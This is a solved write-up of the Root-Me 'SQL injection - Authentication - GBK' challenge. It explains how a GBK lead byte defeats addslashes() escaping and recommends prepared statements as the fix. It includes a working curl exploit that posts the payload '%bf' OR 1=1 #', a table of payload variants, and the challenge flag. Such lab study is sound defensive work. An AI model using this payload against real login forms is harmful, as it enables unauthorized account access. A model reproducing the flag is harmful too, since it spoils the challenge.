# Root-Me — Web-Server: SQL injection - Authentication - GBK (ch42) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch42/
**Challenge:** "Do you speak chinese ?" (30 pts, author dvor4x)
**Goal:** Get an administrator access.

## Answer

```
iMDaFlag1337!
```

(13 bytes, no trailing whitespace — verified with `xxd`.)

## Exploit

Single POST to the login form:

```bash
curl -s -X POST "http://challenge01.root-me.org/web-serveur/ch42/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary 'login=%bf%27%20OR%201%3D1%20%23&password=x'
# -> HTTP 302, Location: logged.php
```

Then read `logged.php` with the session cookie:

```
Congratz! The validation password is: iMDaFlag1337!
```

The payload is `login = <0xBF>' OR 1=1 #` — a **GBK lead byte immediately before the
quote**.

## Vulnerability

The app escapes the input with a charset-unaware function (`addslashes()`), but the MySQL
connection runs in a multi-byte charset (**GBK**). GBK characters are two bytes, and the
backslash that `addslashes()` inserts to escape our quote (`0x5C`) is itself a valid GBK
*trailing* byte. So the escape sequence gets **swallowed into a character**:

```
sent:        BF  27                    (\xBF + ')
after addslashes:  BF  5C  27           (\xBF + \ + ')
GBK decodes:  [BF 5C] = one char        ... 27 is now a bare, UNESCAPED quote
```

The quote escapes its string and the rest of our input becomes SQL.

This is CWE-89 with the classic "multibyte charset" twist (the same class as the
`mysql_real_escape_string` + `SET NAMES` ordering bug).

## Differential — proving the mechanism

The login only ever renders "Erreur d'identification" or redirects, so the **status code is
the oracle**: `302 → logged.php` = authenticated, `200` = rejected.

| `login` payload | HTTP | Verdict |
|---|---|---|
| `' OR 1=1 #` (bare quote) | 200 | quote escaped normally |
| `A' OR 1=1 #` (`0x41` before quote) | 200 | ASCII byte — escape holds |
| `<0x7F>' OR 1=1 #` | 200 | `0x7F` is **not** a valid GBK lead byte |
| `<0x81>' OR 1=1 #` | **302** | valid GBK lead byte → bypass |
| `<0xBF>' OR 1=1 #` | **302** | valid GBK lead byte → bypass |
| `<0xBF>' OR 1=2 #` | 200 | same bypass, but no rows match |
| `admin` / `admin` (no injection) | 200 | normal failure |

Three things this pins down:

1. The bypass **requires a valid GBK lead byte** — `0x81` and `0xBF` work, `0x41` and
   `0x7F` do not. That is the multibyte-escape mechanism, not a coincidence.
2. `OR 1=1` vs `OR 1=2` changes the outcome, so we are genuinely rewriting the query's
   logic rather than tripping some unrelated path.
3. The `#` comment is needed to discard the rest of the original query.

`list_membre.php` confirms the target account exists:

```
Login | 1 admin
```

## Root cause & fix

The escape function and the connection charset disagree. Two layers are wrong:

- **Use prepared statements.** `$stmt = $pdo->prepare('SELECT ... WHERE login = ? AND password = ?')`
  with bound parameters removes escaping from the equation entirely — this is the only
  fully robust fix, because it stops treating user input as SQL at all.
- **If escaping is unavoidable, make it charset-aware.** Set the connection charset
  *before* escaping (`mysqli_set_charset($link,'gbk')` / `$pdo->exec("SET NAMES gbk")`), then
  escape with `mysqli_real_escape_string($link, ...)` — which is charset-aware and will
  correctly produce a double backslash. `addslashes()` is never charset-aware and must not
  be used for SQL.
- Also **stop distinguishing failure modes**: the app leaks success/failure purely through
  the 302-vs-200 redirect, which is what made this oracle work.
